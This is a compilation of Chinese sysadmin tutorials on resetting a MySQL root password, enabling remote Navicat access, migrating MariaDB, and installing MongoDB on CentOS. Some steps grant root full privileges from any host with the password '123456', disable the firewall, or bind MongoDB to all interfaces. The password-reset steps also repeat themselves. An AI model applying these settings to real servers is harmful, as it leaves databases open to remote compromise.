<p> 如果开着就运行关闭的命令：service mysqld stop</p>
<p><img src="https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190929173858703-2071558955.png" alt="img"></p>
<p> <strong>2.修改mysql的配置文件my.conf</strong></p>
<p>一般在/etc目录下，运行命令：vi /etc/my.cnf，编辑文件</p>
<p><img src="https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190930100829664-491241917.png" alt="img"></p>
<p>在文件的<code>[mysqld]标签下添加一句：skip-grant-tables</code></p>
<p><img src="https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190930161834995-303636370.png" alt="img"></p>
<p>然后wq!保存退出。</p>
<p> <strong>3.重启数据库</strong></p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行命令：service mysqld <span class="built_in">start</span></span><br></pre></td></tr></table></figure>

<p> <strong>4.重启数据库</strong></p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行命令：service mysqld <span class="built_in">start</span></span><br></pre></td></tr></table></figure>

<p> <strong>5.进入到mysql数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 运行命令：</span><br><span class="line">mysql -u root </span><br><span class="line">mysql -u root </span><br></pre></td></tr></table></figure>

<p> <strong>6.进入到mysql数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 运行命令：</span><br><span class="line">mysql -u root </span><br><span class="line">mysql -u root </span><br></pre></td></tr></table></figure>

<p> <strong>7.修改密码</strong></p>
<p>　<code>以下是5.6的方式</code></p>
<p>　　运行语句：use mysql;<br>　　继续运行语句：update mysql.user set password=password(‘root_password’) where user=’root’;<br>　　root_password替换成你想要的密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以下是<span class="number">5.7</span>的方式</span><br><span class="line">　　运行语句：</span><br><span class="line">use mysql;</span><br><span class="line">　　继续运行语句：</span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(<span class="string">&#x27;root_password&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;    </span><br><span class="line">　　root_password</span><br><span class="line">替换成你想要的密码</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(<span class="string">&#x27;root_password&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;    </span><br><span class="line">　　root_password</span><br><span class="line">　　root_password</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>  <strong>8.把步骤2加的东西删除掉，在重启服务器，就可以使用刚才修改的密码登录进服务器了。</strong></p>
<p> <code>mysql -u root -p</code></p>
<p>到这一步已经全部结束。</p>
<h1 id="windows下用navicat链接虚拟机MySQL数据库的过程和问题解决"><a href="#windows下用navicat链接虚拟机MySQL数据库的过程和问题解决" class="headerlink" title="windows下用navicat链接虚拟机MySQL数据库的过程和问题解决"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/brankoliu/p/10845491.html">windows下用navicat链接虚拟机MySQL数据库的过程和问题解决</a></h1><p>navicat远程连接虚拟机中的MySQL数据库</p>
<p>1、在linux查看mysql服务器IP地址</p>
<p>  ifconfig</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510171136471-741902129.png" alt="img"></p>
<p>记住此IP</p>
<p>navicat设置</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510170947706-321808436.png" alt="img"></p>
<p> 设置完毕</p>
<p><strong>遇到问题</strong></p>
<p>一直连不上，在网上搜索了一下，主要原因为两种</p>
<p><strong>1 虚拟机防火墙或者 3306端口未启用</strong></p>
<p><strong>2 mysql授权问题</strong></p>
<p><strong>问题1</strong> </p>
<p>连接时错误提示</p>
<p>使用图形界面管理工具Navicat for MySQL连接Mysql数据库时提示错误：Can’t connect to MySQL server (10060)</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510170520040-394183993.png" alt="img"></p>
<p> 问题原因：</p>
<p>导致些问题可能有以下几个原因：</p>
<p>1、网络不通；</p>
<p>2、服务未启动；</p>
<p>3、防火墙端口未开放；</p>
<p>解决方法：</p>
<p>启动服务：</p>
<p>　　首先，我用navicat去远程链接我虚拟机中的MySQL，链接测试失败。</p>
<p>　　然后在虚拟机中查看网络端口信息：</p>
<p>　　#netstat -ntpl</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510164458189-927374514.png" alt="img"></p>
<p>iptables -vnL</p>
<p> 查看防火墙的状态，查看3306端口，</p>
<p> 如果3306如下，是drop状态，或者根本无3306端口，说明3306端口设置问题</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510165456615-1565300417.png" alt="img"></p>
<p><strong>解决办法：</strong></p>
<p>启动服务：</p>
<p><code>service mysqld start;</code></p>
<p>开放防火墙端口<br>添加需要监听的端口<br>/sbin/iptables -I INPUT -p tcp –dport 3306 -j ACCEPT</p>
<p>开启3306端口监听，开启后如下图</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510165145196-812431589.png" alt="img"></p>
<p> <strong>扩展知识</strong></p>
<p>防火墙其他相关操作</p>
<p>临时关闭防火墙服务<br>service iptables stop</p>
<p>开启防火墙服务<br>service iptables start</p>
<p>开机不再启动防火墙服务<br>chkconfig iptables off</p>
<p><strong>问题2</strong></p>
<p>远程链接了一下MySQL，出现了以下错误，查了一下，是因为MySQL没有允许远程登陆，所以要授权MySQL远程登陆。</p>
<p>　　<img src="https://images2015.cnblogs.com/blog/982624/201610/982624-20161025172005421-490284238.png" alt="img"></p>
<p> 从任何主机上使用root用户，密码：yourpassword（你的root密码）连接到mysql服务器：<br>　　# mysql -u root -proot<br>　　mysql&gt;GRANT ALL PRIVILEGES ON <em>.</em> TO ‘root‘@’%’ IDENTIFIED BY ‘yourpassword’ WITH GRANT OPTION;</p>
<p>　　操作完后切记执行以下命令刷新权限<br>　　 FLUSH PRIVILEGES</p>
<p> 　这时再通过navicat远程链接MySQL，链接测试，如下图，成功。</p>
<p><img src="https://img2018.cnblogs.com/blog/1684288/201905/1684288-20190510171925473-2058049608.png" alt="img"></p>
<p> 分类: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/brankoliu/category/1461963.html">MySQL</a></p>
<h1 id="MariaDB-数据库迁移"><a href="#MariaDB-数据库迁移" class="headerlink" title="*MariaDB* *数据库迁移*"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30567225/article/details/95318407">*<strong>MariaDB* *数据库迁移*</strong></a></h1><p>2018-02-26 12:35:00</p>
<h3 id="一、为什么要迁移"><a href="#一、为什么要迁移" class="headerlink" title="一、为什么要迁移"></a>一、为什么要迁移</h3><p>我的七月小说站点放在JCloud上，恕我直言，配合我的Aliyun服务器进行数据交互，那是相当的慢，没办法，京东云上面十几块钱的公网ip，也就这样了。<br>所以我决定把web服务器和数据库部署到一起。</p>
<h3 id="二、迁移前导步骤"><a href="#二、迁移前导步骤" class="headerlink" title="二、迁移前导步骤"></a>二、迁移前导步骤</h3><p>迁移过程中顺便记录一手，供后面再次迁移到别的服务器上查阅，省的麻烦。<br>服务器是CentOS 7.4<br>1.再次安装MariaDB<br><code>yum -y install mariadb mariadb-server</code><br>2.启动MariaDB<br><code>systemctl start mariadb</code><br>3.设置开机自启<br><code>systemctl enable mariadb</code><br>4.简单配置一下<br><code>mysql_secure_installation</code><br>5.进入用户，配置权限</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;jiajin&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;your password&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span>  <span class="keyword">all</span>  <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> jiajin@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">quit;</span><br><span class="line">flush privileges; </span><br></pre></td></tr></table></figure>

<p>6.字符集配置<br>进入my.cnf<code>vi /etc/my.cnf</code><br>在[msqld]标签下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init_connect=&#x27;SET collation_connection = utf8_unicode_ci&#x27; </span><br><span class="line">init_connect=&#x27;SET NAMES utf8&#x27; </span><br><span class="line">character-set-server=utf8 </span><br><span class="line">collation-server=utf8_unicode_ci </span><br><span class="line">skip-character-set-client-handshake</span><br></pre></td></tr></table></figure>

<p>进入文件/etc/my.cnf.d/client.cnf<br>在[client]中添加<code>default-character-set=utf8</code><br>进入文件/etc/my.cnf.d/mysql-clients.cnf<br>在[mysql]中添加<code>default-character-set=utf8</code><br>好了，重启MariaDB<code>systemctl restart mariadb</code><br>创建数据库<code>create database novel</code></p>
<h3 id="三、迁移数据库表和结构"><a href="#三、迁移数据库表和结构" class="headerlink" title="三、迁移数据库表和结构"></a>三、迁移数据库表和结构</h3><p>先cd到mysql的运行路径下，再执行一下命令：<br>1.导出数据和表结构：<br>mysqldump -u用户名 -p密码 数据库名 &gt; 数据库名.sql<br>mysqldump -uroot -p dbname &gt; dbname .sql<br>敲回车后会提示输入密码<br>2.只导出表结构<br>mysqldump -u用户名 -p密码 -d 数据库名 &gt; 数据库名.sql<br>mysqldump -uroot -p -d dbname &gt; dbname .sql<br>3.导入数据库<br>方法一：<br>（1）选择数据库<br>mysql&gt;use dbname ;<br>（2）设置数据库编码<br>mysql&gt;set names utf8;<br>（3）导入数据（注意sql文件的路径）<br>mysql&gt;source /home/xxxx/dbname .sql;<br>方法二：<br>mysql -u用户名 -p密码 数据库名 &lt; 数据库名.sql</p>
<p>转载于:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jiajin/p/8472590.html">https://www.cnblogs.com/jiajin/p/8472590.html</a></p>
<p>更多相关内容</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_32296621/article/details/116336226">使用Oracle SQL Developer工具完成<em>Mariadb数据库迁移</em>到Oracle数据库</a>2021-05-02 01:14:32</p>
<p>Oracle SQL Developer 是一个免费的集成开发环境，简化了传统部署和云部署中 Oracle 数据库的开发和管理。SQL Developer 提供完整的端到端的 PL/SQL 应用开发，包括一个用于运行查询和脚本的工作表，一个用于管理数据库的 DBA 控制台，一个报告界面、一个全面的数据建模解决方案，以及一个用于将您的第三方数据库迁移到 Oracle 的迁移平台。</p>
<p>“我们很高兴看到 Oracle SQL Developer 得到了广泛应用。开发人员社区已经接受 SQL Developer 作为设计、开发和 DBA 活动的事实上的标准数据库 IDE。”— Oracle 数据库工具副总裁 Michael J. Hichwa</p>
<p>一、准备工作</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f221a66d277cbb730b0e9f190ad4fe5f.png" alt="f221a66d277cbb730b0e9f190ad4fe5f.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/693a8fd569b1b35f7dfd7ebfda73f289.png" alt="693a8fd569b1b35f7dfd7ebfda73f289.png"></p>
<p>二、设置Oracle SQL Developer中文界面</p>
<p>首先，找到Oracle SQL Developer的安装目录；随后，在“ide\bin”目录下打开ide.conf文件；然后，将AddVMOption -Duser.language=zh 与 AddVMOption -Duser.country=CN 各占一行写入。</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0feb3337070f70fb55231b1178a9d5fc.png" alt="0feb3337070f70fb55231b1178a9d5fc.png"></p>
<p>最后，保存文件，重启Oracle Oracle SQL Developer.</p>
<p>三、设置Oracle SQL Developer的Mysql支持插件</p>
<p>Oracle SQL Developer安装完后需要在工具–首选项–数据库–第三方JDBC驱动程序窗口添加刚才下载的mysql-connector-java-8.0.23.jar</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5c6a36cf122e61caee948b72673ad24c.png" alt="5c6a36cf122e61caee948b72673ad24c.png"></p>
<p>四、开始准备迁移数据库</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/cb71e928231476e69e2c195a1868ee48.png" alt="cb71e928231476e69e2c195a1868ee48.png"></p>
<p>在oracle库上右键选择‘关联迁移库资料档案库’菜单</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/47d5d4be1dbbf8a5fd33a4e5ebd6c215.png" alt="47d5d4be1dbbf8a5fd33a4e5ebd6c215.png"></p>
<p>在Mariadb库上右键选择‘迁移到Oracle…’菜单</p>
<p>五、开始迁移数据库</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7040272255f04a1c59ea3e1c37e1d220.png" alt="7040272255f04a1c59ea3e1c37e1d220.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/59ddefa38bc62c0568421fc67a4d0273.png" alt="59ddefa38bc62c0568421fc67a4d0273.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/a10cf2c2e3039b68f36dba8fa3a196a8.png" alt="a10cf2c2e3039b68f36dba8fa3a196a8.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/034acad5de6e66d410ed78043ff30c21.png" alt="034acad5de6e66d410ed78043ff30c21.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7d377c042ab595db5a1bbec9d79159f1.png" alt="7d377c042ab595db5a1bbec9d79159f1.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/781c260276dff5b06b26cdf073cd47a9.png" alt="781c260276dff5b06b26cdf073cd47a9.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ec5b6c391abd600457a95efb2b1875cf.png" alt="ec5b6c391abd600457a95efb2b1875cf.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e14eb42dfc39443aca2b6e3a44cd649c.png" alt="e14eb42dfc39443aca2b6e3a44cd649c.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/33abd2ea081756457d59c06a5162a608.png" alt="33abd2ea081756457d59c06a5162a608.png"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/07441a26d39e163a0e9f338244caffca.png" alt="07441a26d39e163a0e9f338244caffca.png"></p>
<p>恭喜您，迁移成功！</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b41a3a478391653c2a0eb8246a5012c2.png" alt="b41a3a478391653c2a0eb8246a5012c2.png"></p>
<p>六、扫尾工作</p>
<p>Oracle执行了第三步‘关联迁移库资料档案库’菜单后，可以打开之前的连接查看，会生成一些表格，是用于在数据迁移过程中记录相关数据；所以迁移完成后，需要删除oracle库中这些多余的表：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/de5b8b22ea15a3877d9996a0d7d49f85.png" alt="de5b8b22ea15a3877d9996a0d7d49f85.png"></p>
<p>在oracle库上右键选择‘删除迁移库资料档案库’菜单</p>
<p>七、最终成果展示</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/516e37447b9ee16a2afff66887a2a009.png" alt="516e37447b9ee16a2afff66887a2a009.png"></p>
<p>OK，欢迎大家持续关注潤沁實業教育领域潤沁網路大學系列课程。</p>
<p>原文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/runqinshiye/p/14444912.html">https://www.cnblogs.com/runqinshiye/p/14444912.html</a></p>
<p><a href="javascript:;">收起 <img src="https://csdnimg.cn/release/aggregate/img/arrow-down@2x.png" alt="img"></a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jzdriver/article/details/104747448/?utm_term=mariadb%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-0-104747448-null-null&spm=3001.4430"><em>MariaDB</em> 10.5 <em>迁移</em> datadir <em>数据库</em>目录 到 /home文件夹下</a></p>
<p>执行mysql_secure_installation 或 mysql_install_db –user=mysql 进行常规安装 执行systemctl start <em>mariadb</em> 启动<em>数据库</em>———(截止这步,都是常规安装) 确认<em>数据库</em>正常后,开始目录<em>迁移</em> 执行cp …</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/YABIGNSHI/article/details/120284067?utm_term=mariadb%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%81%E7%A7%BB&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-120284067-null-null&spm=3001.4430">…套<em>mariadb</em>+maxscale上_雅冰石的博客_<em>mariadb 数据迁移</em></a></p>
<p>先将目标端的<em>mariadb</em>主库临时成为源端主库的从库,进行主从复制,从而保证数据同步,避免影响业务,然后切程序里连的<em>数据库</em>代理ip。 3.1 修改目标端主库的server_id #由于源端和目标端的server_id冲突,因此这里需要改下目标端主库的serve…</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wxlbrxhb/article/details/115632404"><em>mariadb</em>数据文件<em>迁移</em></a>2021-04-12 17:48:09</p>
<p>1、首先启动mariadb数据库，由于初次配置时会报错，所以这里我们重启他一次。<br>systemctl restart mariadb.service<br><img src="https://img-blog.csdnimg.cn/20210412174840269.jpg#pic_center" alt="在这里插入图片描述"></p>
<p>2、输入mysql_secure_installation，下面的各类选项，比如设置密码、是否删除测试库等等根据需要选择即可。<br><img src="https://img-blog.csdnimg.cn/20210412174856435.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4bGJyeGhi,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>3、停止mariadb数据库，systemctl stop mariadb.service，因为数据库的数据文件在运行状态的时候是无法迁移的。<br><img src="https://img-blog.csdnimg.cn/20210412174916377.jpg#pic_center" alt="在这里插入图片描述"></p>
<p>4、创建需要存放数据库文件的目录，mkdir –p/home/data/mysql<br><img src="https://img-blog.csdnimg.cn/20210412174940714.jpg#pic_center" alt="在这里插入图片描述"></p>
<p>5、对新建的目录进行授权，chown –R mysql:mysql /home/data/mysql<br><img src="https://img-blog.csdnimg.cn/20210412175216202.jpg#pic_center" alt="在这里插入图片描述"></p>
<p>6、将原mariadb数据库的数据文件复制到新的目录中，默认数据文件相关的东西都在/var/lib/mysql/目录下，cp –a /var/lib/mysql/* /home/data/mysql/<br><img src="https://img-blog.csdnimg.cn/20210412175155237.jpg#pic_center" alt="在这里插入图片描述"></p>
<p>7、编辑/etc/my.cnf文件，将其中的datadir后面的目录改成新建的目录。<br><img src="https://img-blog.csdnimg.cn/20210412175130428.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4bGJyeGhi,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>8、启动mariadb数据库，登录数据库之后输入命令show global variables like “%datadir%”，如果出现新目录为新目录则修改成功。</p>
<p><img src="https://img-blog.csdnimg.cn/20210412175052202.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4bGJyeGhi,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><a href="javascript:;">收起 <img src="https://csdnimg.cn/release/aggregate/img/arrow-down@2x.png" alt="img"></a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Max_fzy/article/details/109686432"><em>mariaDB数据库</em>转移mysql数据库</a>2020-11-14 09:36:30</p>
<p>由于现在mysql处于开源状态，有部分用户已经在使用mariaDB了。</p>
<p>但是当原本有mysql数据库的情况下又有mariaDB。怎么把mariaDB数据库的表和数据导入到Mysql数据库里。</p>
<p>mariaDB数据库转换mysql 不能直接导出SQL+数据 需要分开用模型导出建表语句和再导出SQL数据,两者的差异参考以下示例。</p>
<p>mariaDB导出的SQL对字段使用 “ 双引号标识，而mysql则使用 ` 进行标识。</p>
<p>mariaDb导出示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE <span class="string">&quot;gl_activity&quot;</span> (</span><br><span class="line">  <span class="string">&quot;act_id&quot;</span> <span class="keyword">int</span>(<span class="number">10</span>) unsigned NOT <span class="literal">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">  <span class="string">&quot;actname&quot;</span> <span class="title function_ invoke__">varchar</span>(<span class="number">50</span>) DEFAULT <span class="literal">NULL</span> COMMENT <span class="string">&#x27;活动名称&#x27;</span>,</span><br><span class="line">  PRIMARY <span class="title function_ invoke__">KEY</span> (<span class="string">&quot;act_id&quot;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20201114092202535.png#pic_center" alt="在这里插入图片描述"></p>
<p>mysql导出示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `gl_activity` (</span><br><span class="line">`act_id` <span class="keyword">int</span>(<span class="number">10</span>) UNSIGNED NOT <span class="literal">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;主键ID&#x27;</span>,</span><br><span class="line">`actname` <span class="title function_ invoke__">varchar</span>(<span class="number">50</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="literal">NULL</span> DEFAULT <span class="literal">NULL</span> COMMENT <span class="string">&#x27;活动名称&#x27;</span>,</span><br><span class="line">PRIMARY <span class="title function_ invoke__">KEY</span> (`act_id`) </span><br><span class="line">)</span><br><span class="line">ENGINE=InnoDB</span><br><span class="line">DEFAULT CHARACTER SET=utf8 COLLATE=utf8_general_ci</span><br><span class="line">AUTO_INCREMENT=<span class="number">4</span></span><br><span class="line">COMMENT=<span class="string">&#x27;活动表&#x27;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20201114092241743.png#pic_center" alt="在这里插入图片描述"></p>
</li>
</ul>
<h1 id="Centos环境下安装mongoDB"><a href="#Centos环境下安装mongoDB" class="headerlink" title="Centos环境下安装mongoDB"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/layezi/p/7290082.html">Centos环境下安装mongoDB</a></h1><p>安装前注意: 此教程是通过yum安装的.仅限64位centos系统</p>
<p>安装步骤:</p>
<p>1、创建仓库文件: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/yum.repos.d/mongodb-org-3.4.repo</span><br></pre></td></tr></table></figure>

<p> 然后复制下面配置,保存退出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[mongodb-org-3.4]``name=MongoDB Repository``baseurl=https:``//repo.mongodb.org/yum/redhat/$releasever/mongodb-org/3.4/x86_64/``gpgcheck=1``enabled=1``gpgkey=https:``//www.mongodb.org/static/pgp/server-3.4.asc</span><br></pre></td></tr></table></figure>

<p> 2、yum安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y mongodb-org</span><br></pre></td></tr></table></figure>

<p> 没有权限就在前面加:  sudo</p>
<p>安装完毕后修改配置文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/mongod.conf</span><br></pre></td></tr></table></figure>

<p> 修改配置文件的 <code>bind_ip,</code> 默认是 <code>127.0.0.1 只限于本机连接</code>。所以安装完成后必须把这个修改为 0.0.0.0 ,否则通过别的机器是没法连接的!</p>
<p>3、启动、停止、重启</p>
<p>MongoDB默认将数据文件存储在<code>/var/lib/mongo</code>目录，默认日志文件在<code>/var/log/mongodb</code>中。如果要修改,可以在 <code>/etc/mongod.conf</code> 配置中指定备用日志和数据文件目录。</p>
<p>启动命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mongod start</span><br></pre></td></tr></table></figure>

<p> 停止命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mongod stop</span><br></pre></td></tr></table></figure>

<p> 重启命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mongod restart</span><br></pre></td></tr></table></figure>

<p>查看mongoDB是否启动成功:</p>
<p>可以通过查看日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /``var``/log/mongodb/mongod.log</span><br></pre></td></tr></table></figure>

<p> 日志文件应该会出现如下一句说明</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[initandlisten] waiting for connections on port &lt;port&gt;</span><br></pre></td></tr></table></figure>

<p><port> 是mongodb运行端口</p>
<p>设置开机启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig mongod ``on</span><br></pre></td></tr></table></figure>

<p> 4、使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-d0nk2r2c ~]# mongo` `## 查看数据库``&gt; show dbs;` `## 查看数据库版本``&gt; db.version();` `## 常用命令帮助``&gt; db.help();</span><br></pre></td></tr></table></figure>

<p> 5、卸载移除mongo</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum erase $(rpm -qa | grep mongodb-org)</span><br></pre></td></tr></table></figure>

<p> 6、移除数据库文件和日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r /``var``/log/mongodb``rm -r /``var``/lib/mongo</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://docs.mongodb.com/master/tutorial/install-mongodb-on-red-hat/">https://docs.mongodb.com/master/tutorial/install-mongodb-on-red-hat/</a></p>
<p>个人博客: <a target="_blank" rel="noopener" href="https://lanxy.top/">https://lanxy.top</a></p>
<h1 id="本地连不上远程虚拟机的mysql"><a href="#本地连不上远程虚拟机的mysql" class="headerlink" title="本地连不上远程虚拟机的mysql"></a>本地连不上远程虚拟机的mysql</h1><p>一、写于2019.12.23</p>
<p>navicat：不修改数据库配置的情况下直接连接【先配置SSH，就是putty或者xshell远程连接的方式连接，然后再配置常规，主机localhost即可，相当于进入主机之后操作的数据库，完美！！】</p>
<p> 二、写于2019.6.14</p>
<p>虚拟机新装mysql时，由于权限不够，本地连不上，只能在虚拟机内部mysql操作。</p>
<p>1、首先sufo ufw status查看防火墙是否开启，状态为inactive说明没有开启防火墙。</p>
<p>2、然后输入netstat -an|grep 3306查看端口启动和占用情况，可以看到绑定为127.0.0.1，这块需要我们修改为0.0.0.0。3、进入虚拟机，修改mysql访问权限，依次执行</p>
<p>mysql -uroot -p</p>
<p>use mysql;<br>4、更新某一条mysql用户的权限（新装的mysql可以不执行第四步）</p>
<p>select host,user from user where user=’root’;<br>//如果上面查询到有信息,但host为localhost或其他值，就需要根据实际需求来更新表信息<br>//host代表本地可以访问<br>update user set host=’%’ where user=’root’ # 如果想任何的IP地址都可以使用root用户来远程登陆（注意如果上面的查询语句，查询出来有多条，就需要做一些处理，比如多加一个条件如 where user=’root’ and host=’localhost’或先删除其他人记录只保存一条user=’root’的记录）<br>5、指定所有客户端都可以使用root账户访问mysql。</p>
<p>//更改权限 语法模板<br>grant all privileges on 库名.表名 to ‘用户名‘@’IP地址’ identified by ‘密码’ with grant option;</p>
<p>//指定所有客户端都可以使用root账户访问mysql。<br>grant all privileges on <em>.</em> to ‘root‘@’%’ identified by ‘123456’ with grant option;<br>flush privileges;</p>
<p>//退出mysql，重启服务<br>exit;<br>sudo service mysql restart</p>
<p>注释：<br>库名:要远程访问的数据库名称,所有的数据库使用“<em>”<br>表名:要远程访问的数据库下的表的名称，所有的表使用“</em>”<br>用户名:要赋给远程访问权限的用户名称<br>IP地址:可以远程访问的电脑的IP地址，所有的地址使用“%”<br>密码:要赋给远程访问权限的用户对应使用的密码</p>
